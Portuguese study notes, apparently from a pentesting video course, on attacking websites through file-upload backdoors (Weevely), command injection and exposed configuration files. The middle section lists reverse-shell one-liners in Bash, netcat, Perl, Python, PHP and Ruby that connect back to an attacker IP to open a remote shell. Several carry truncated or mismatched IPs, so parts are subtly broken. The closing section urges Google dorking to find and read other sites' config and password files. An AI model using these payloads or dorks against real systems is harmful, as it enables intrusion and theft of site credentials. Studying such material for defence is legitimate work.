
### Upload de arquivos em computadores/serves alvos

Em sites que permitem upload de arquivos podem possuir uma falha onde um cracker consegue enviar um arquivo com scripts maliciosos visando infectar ou o site ou o servidor que hospeda este site. A ferramenta utilizada para os devidos testes será Weevely, permitindo a criação de payloads em php que executam instruções podendo encontrar a devida falha no site e criar um backdoor para o cracker. 

### Execução de códigos

Dentro dos sites é possível testar vulnerabilidade de execução de scripts na linguagem em que foi montado e criar um backdoor de forma que possa chamar menos atenção que a técnica anterior. Os scripts(códigos) serão testados e executados nos campos de input do site. Geralmente, os servidores onde eles estão mantidos são baseados em linux, logo, scripts em Bash podem ser um bom teste inicial. 

*Os exemplos a seguir forma usados em um vídeo em que o instrutor assumia que o IP do cracker era 10.20.14.200 e usava a porta 8080 como backdoor*

Backdoor com Bash:

```Bash
bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
```

O NetCat também pode ser usado. Se o servidor for baseado em Linux, podemos usar o comando que conecta um computador a outro pelo NetCat (REVISAR):

```Netcat
nc -e /bin/sh 10.20.14.200 8080
```

Aqui estão alguns outras formas de testar:

```Pearl
perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```PHP
php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```Ruby
ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Arquivos Inclusos no site

No diretório de um site há arquivos que guardam informações importantes como configurações, bancos de dados e até senhas de usuários. Tipos de arquivos assim, **jamais** deveriam ser de fácil acesso aos visitantes do site, porém ainda há sites que são mantidos com este tipo de falha e é até algo comum, mesmo em 2025. 

Encontrar esse tipo de falha pode ser feito digitando na URL do site. Podemos colocar o endereço de um diretório de arquivos, conseguir chegar até ele e ler oque está escrito por ali. Ou de uma maneira mais fácil usando google hacking. Neste caso, podemos encontrar falhas em mais de um site. Tente, por exemplo, pesquisar usando *index of: config.php* que uma "pá" de sites serão apresentados com seus arquivos de php e serem acessados.

---
Weevely: https://www.kali.org/tools/weevely/ | https://github.com/epinna/weevely3/wiki